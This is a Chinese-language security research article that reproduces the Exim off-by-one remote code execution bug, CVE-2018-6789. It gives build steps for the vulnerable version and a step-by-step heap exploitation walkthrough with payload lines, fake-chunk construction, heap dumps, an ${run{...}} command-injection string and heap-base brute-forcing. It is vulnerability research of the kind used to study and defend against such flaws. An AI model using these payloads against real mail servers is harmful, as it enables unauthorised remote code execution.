**作者：Hcamael@知道创宇404实验室**  
**英文版本：<https://paper.seebug.org/1024/>**

前段时间meh又挖了一个Exim的RCE漏洞，而且这次RCE的漏洞的约束更少了，就算开启了PIE仍然能被利用。虽然去年我研究过Exim，但是时间过去这么久了，所以这次复现还是花了大量时间在熟悉Exim源码上。

本次漏洞复现的过程中，踩了好多坑，实际复现的过程中发现堆块的实际情况无法像meh所说的那样的构造，所以在这部分卡了很久(猜测是因为环境不同的原因)，之后决定先理解meh利用的大致思路，然后自己根据实际情况对堆块进行构造，虽然过程艰难，但最终基本算是成功了。

#### 复现环境搭建

本次使用的环境和上次大致相同, 首先去github上该漏洞的patch commit

然后把分支切换到上一个commit

    
    
    $ git clone https://github.com/Exim/exim.git
    $ git checkout 38e3d2dff7982736f1e6833e06d4aab4652f337a
    $ cd src
    $ mkdir Local

Makefile仍然使用上次那个:

    
    
    $ cat Local/makefile | grep -v "#"
    BIN_DIRECTORY=/usr/exim/bin
    CONFIGURE_FILE=/usr/exim/configure
    EXIM_USER=ubuntu
    SPOOL_DIRECTORY=/var/spool/exim
    ROUTER_ACCEPT=yes
    ROUTER_DNSLOOKUP=yes
    ROUTER_IPLITERAL=yes
    ROUTER_MANUALROUTE=yes
    ROUTER_QUERYPROGRAM=yes
    ROUTER_REDIRECT=yes
    TRANSPORT_APPENDFILE=yes
    TRANSPORT_AUTOREPLY=yes
    TRANSPORT_PIPE=yes
    TRANSPORT_SMTP=yes
    LOOKUP_DBM=yes
    LOOKUP_LSEARCH=yes
    LOOKUP_DNSDB=yes
    PCRE_CONFIG=yes
    FIXED_NEVER_USERS=root
    AUTH_CRAM_MD5=yes
    AUTH_PLAINTEXT=yes
    AUTH_TLS=yes
    HEADERS_CHARSET="ISO-8859-1"
    SUPPORT_TLS=yes
    TLS_LIBS=-lssl -lcrypto
    SYSLOG_LOG_PID=yes
    EXICYCLOG_MAX=10
    COMPRESS_COMMAND=/usr/bin/gzip
    COMPRESS_SUFFIX=gz
    ZCAT_COMMAND=/usr/bin/zcat
    SYSTEM_ALIASES_FILE=/etc/aliases
    EXIM_TMPDIR="/tmp"

然后就是编译安装了:

    
    
    $ make -j8
    $ sudo make install

启动也是跟上次一样，但是这里有一个坑点，开启debug，输出所有debug信息，不开debug，这些都堆的布局都会有影响。不过虽然有影响，但是只是影响构造的细节，总体的构造思路还是按照meh写的paper中那样。

本篇的复现，都是基于只输出部分debug信息的模式：

    
    
    $ /usr/exim/bin/exim -bdf -dd
    # 输出完整debug信息使用的是-bdf -d+all
    # 不开启debug模式使用的是-bdf

#### 漏洞复现

因为我觉得meh的文章中，漏洞原理和相关函数的说明已经很详细，我也没啥要补充的，所以直接写我的复现过程

##### STEP 1

首先需要构造一个被释放的chunk，但是没必要像meh文章说的是一个0x6060大小的chunk，只需要满足几个条件:

![](https://images.seebug.org/content/images/2018/04/f2374a7c-7581-47c8-a90e-f41e224426a8.jpg-w331s)

这个chunk要被分为三个部分，一个部分是通过`store_get`获取，用来存放base64解码的数据，用来造成`off by
one`漏洞，覆盖下一个chunk的size，因为通过`store_get`获取的chunk最小值是0x2000，然后0x10的堆头和0x10的exim自己实现的堆头，所以是一个至少0x2020的堆块。

第二部分用来放`sender_host_name`，因为该变量的内存是通过`store_malloc`获取的，所以没有大小限制

第三部分因为需要构造一个fake chunk用来过free的检查，所以也是一个至少0x2020的堆块

和meh的方法不同，我通过`unrecognized command`来获取一个0x4041的堆块，然后通过`EHLO`来释放:

    
    
    p.sendline("\x7f"*4102)
    p.sendline("EHLO %s"%("c"*(0x2010)))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x4041,
      fd = 0x7f9520917b78,
      bk = 0x1d1b1e0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d191c0 {
      prev_size = 0x4040,
      size = 0x2020,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }

0x1d15180是通过`unrecognized command`获取的一个0x4040大小的chunk，在执行完`EHLO`命令后被释放,
然后0x1d191c0是inuse的`sender_host_name`，这两部分就构成一个0x6060的chunk

##### STEP 2

现在的情况是`sender_host_name`位于0x6060大小chunk的最底部，而我们需要把它移到中间

这部分的思路和meh的一样，首先通过`unrecognized command`占用顶部0x2020的chunk

之前的文章分析过，`unrecognized command`申请内存的大小是`ss = store_get(length + nonprintcount
* 3 + 1);`

通过计算，只需要让`length + nonprintcount * 3 + 1 >
yield_length`，`store_get`函数就会从malloc中申请一个chunk

    
    
    p.sendline("\x7f"*0x800)

这个时候我们就能使用`EHLO`释放之前的`sender_host_name`，然后重新设置，让`sender_host_name`位于0x6060大小chunk的中部

    
    
    p.sendline("EHLO %s"%("c"*(0x2000-9)))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x7f9520917b78,
      bk = 0x1d191a0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d171a0 {
      prev_size = 0x2020,
      size = 0x2000,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d191a0 PREV_INUSE {
      prev_size = 0x63636363636363,
      size = 0x6061,
      fd = 0x1d15180,
      bk = 0x7f9520917b78,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d1f200 {
      prev_size = 0x6060,
      size = 0x2020,
      fd = 0x1d27380,
      bk = 0x2008,
      fd_nextsize = 0x6363636363636328,
      bk_nextsize = 0x6363636363636363
    }

##### STEP 3

现在我们的堆布局是：

  * 第一块未被使用的0x2020大小的chunk
  * 第二块正在被使用0x2000大小的`sender_host_name`
  * 第三块未被使用，并且和之后堆块合并, 0x6060大小的chunk

我们现在再回过头来想想各个chunk的size的设置的问题

###### CHUNK 1

第一个chunk是用来触发`off by one`漏洞，用来修改第二个CHUNK的size位，只能溢出1byte

`store_get`最小分配一个0x2020的chunk，能储存0x2000的数据

这就导致了，如果按照`store_get`的最小情况来，只能溢出覆盖掉第二个chunk的pre_size位

然后因为`(0x2008-1)%3==0`，所以我们能通过b64decode函数的漏洞申请一个能储存0x2008的数据，size=0x2020的chunk，然后溢出一个字节到下一个chunk的size位

###### CHUNK2

第二块chunk，我们首先需要考虑，因为只能修改一个字节，所以最大只能从0x00扩展到0xf0

其次，我们假设第二块chunk的原始size=0x2021，然后被修改成0x20f1，我们还需要考虑第二块chunk+0x20f1位置的堆块我们是否可控，因为需要伪造一个fake
chunk，来bypass free函数的安全检查。

经过多次调试，发现当第二块chunk的size=0x2001时，更方便后续的利用

###### CHUNK3

第三个chunk只要求大于一个`store_get`申请的最小size(0x2020)就行了

##### STEP 4

根据第三步叙述的，我们来触发`off by one`漏洞

    
    
    payload1 = "HfHf"*0xaae
    p.sendline("AUTH CRAM-MD5")
    p.sendline(payload1[:-1])
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE IS_MMAPED {
      prev_size = 0x6363636363636363,
      size = 0x6363636363636363,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }

并且构造在第三块chunk中构造一个fake chunk

    
    
    payload = p64(0x20f0)+p64(0x1f31)
    p.sendline("AUTH CRAM-MD5")
    p.sendline((payload*484).encode("base64").replace("\n",""))
    # heap
    0x1d15180 PREV_INUSE {
      prev_size = 0x0,
      size = 0x2021,
      fd = 0x1d191b0,
      bk = 0x2008,
      fd_nextsize = 0xf11ddff11ddff11d,
      bk_nextsize = 0x1ddff11ddff11ddf
    }
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x6363636363636363,
      bk = 0x6363636363636363,
      fd_nextsize = 0x6363636363636363,
      bk_nextsize = 0x6363636363636363
    }
    0x1d19290 PREV_INUSE {
      prev_size = 0xf0,
      size = 0x1f31,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }
    0x1d1b1c0 PREV_INUSE {
      prev_size = 0x2020,
      size = 0x4041,
      fd = 0x7f9520918288,
      bk = 0x7f9520918288,
      fd_nextsize = 0x1d1b1c0,
      bk_nextsize = 0x1d1b1c0
    }

##### STEP 5

下一步跟meh一样，通过释放`sender_host_name`，把一个原本0x2000的chunk扩展成0x20f0,
但是却不触发`smtp_reset`

    
    
    p.sendline("EHLO a+")
    # heap
    0x1d171a0 PREV_INUSE {
      prev_size = 0x1ddff11ddff11ddf,
      size = 0x20f1,
      fd = 0x1d21240,
      bk = 0x7f9520917b78,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x1d19290 {
      prev_size = 0x20f0,
      size = 0x1f30,
      fd = 0x20f0,
      bk = 0x1f31,
      fd_nextsize = 0x20f0,
      bk_nextsize = 0x1f31
    }

##### STEP 6

meh提供了一种不需要泄露地址就能RCE的思路

exim有一个`expand_string`函数，当其处理的参数中有`${run{xxxxx}}`, `xxxx`则会被当成shell命令执行

而`acl_check`函数中会对各个命令的配置进行检查，然后把配置信息的字符串调用`expand_string`函数

我复现环境的配置信息如下:

    
    
    pwndbg> x/18gx &acl_smtp_vrfy
    0x6ed848 <acl_smtp_vrfy>:   0x0000000000000000  0x0000000000000000
    0x6ed858 <acl_smtp_rcpt>:   0x0000000001cedac0  0x0000000000000000
    0x6ed868 <acl_smtp_predata>:    0x0000000000000000  0x0000000000000000
    0x6ed878 <acl_smtp_mailauth>:   0x0000000000000000  0x0000000000000000
    0x6ed888 <acl_smtp_helo>:   0x0000000000000000  0x0000000000000000
    0x6ed898 <acl_smtp_etrn>:   0x0000000000000000  0x0000000000000000
    0x6ed8a8 <acl_smtp_data>:   0x0000000001cedad0  0x0000000000000000
    0x6ed8b8 <acl_smtp_auth>:   0x0000000001cedae0  0x0000000000000000

所以我有`rcpt`, `data`, `auth`这三个命令可以利用

比如`0x0000000001cedae0`地址当前的内容是:

    
    
    pwndbg> x/s 0x0000000001cedae0
    0x1cedae0:  "acl_check_auth"

当我把该字符串修改为`${run{/usr/bin/touch /tmp/pwned}}`

则当我向服务器发送`AUTH`命令时，exim将会执行`/usr/bin/touch /tmp/pwned`

所以之后就是meh所说的利用链:

修改`storeblock`的next指针为储存`acl_check_xxxx`字符串的堆块地址 -> 调用smtp_reset ->
储存`acl_check_xxxx`字符串的堆块被释放丢入unsortedbin ->
申请堆块，当堆块的地址为储存`acl_check_xxxx`字符串的堆块时，我们可以覆盖该字符串为命令执行的字符串 -> RCE

##### STEP 7

根据上一步所说，我们首先需要修改next指针，第二块chunk的原始大小是0x2000，被修改后新的大小是0x20f0，下一个`storeblock`的地址为第二块chunk+0x2000，next指针地址为第二块chunk+0x2010

所以我们申请一个0x2020的chunk，就能够覆盖next指针：

    
    
    p.sendline("AUTH CRAM-MD5")
    p.sendline(base64.b64encode(payload*501+p64(0x2021)+p64(0x2021)+p32(address)))

这里有一个问题

第二个chunk在`AUTH CRAM-MD5`命令执行时就被分配了，所以`b64decode`的内存是从`next_yield`获取的

这样就导致一个问题，我们能通过之前的构造来控制在执行`b64decode`时`yield_length`的大小，最开始我的一个思路就是，仍然利用`off
by one`漏洞来修改next，这也是我理解的meh所说的`partial write`

但是实际情况让我这个思路失败了

    
    
    pwndbg> x/16gx 0x1d171a0+0x2000
    0x1d191a0:  0x0063636363636363  0x0000000000002021
    0x1d191b0:  0x0000000001d171b0  0x0000000000002000

当前的next指针的值为0x1d171b0，如果利用我的思路是可以修改1-2字节，然而储存`acl_check_xxx`字符的堆块地址为0x1ced980

我们需要修改3字节，所以这个思路行不通

所以又有了另一个思路，因为exim是通过fork起子进程来处理每个socket连接的，所以我们可以爆破堆的基地址，只需要爆破2byte

##### STEP 8

在解决地址的问题后，就是对堆进行填充，然后修改相关`acl_check_xxx`指向的字符串

然后附上利用截图：

![](https://images.seebug.org/content/images/2018/04/43e0727d-168a-403e-8995-687d9d393ae0.png-w331s)

#### 总结

坑踩的挺多，尤其是在纠结meh所说的`partial
write`，之后在github上看到别人公布的exp，同样也是使用爆破的方法，所以可能我对`partial write`的理解有问题吧

另外，通过与github上的exp进行对比，发现不同版本的exim，`acl_check_xxx`的堆偏移也有差别，所以如果需要RCE
exim，需要满足下面的条件：

  1. 包含漏洞的版本(小于等于commit 38e3d2dff7982736f1e6833e06d4aab4652f337a的版本)
  2. 开启CRAM-MD5认证，或者其他有调用b64decode函数的认证
  3. 需要有该exim的binary来计算堆偏移
  4. 需要知道exim的启动参数

#### 参考

  1. <https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/>
  2. <https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1>
  3. <https://github.com/skysider/VulnPOC/tree/master/CVE-2018-6789>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/557/>

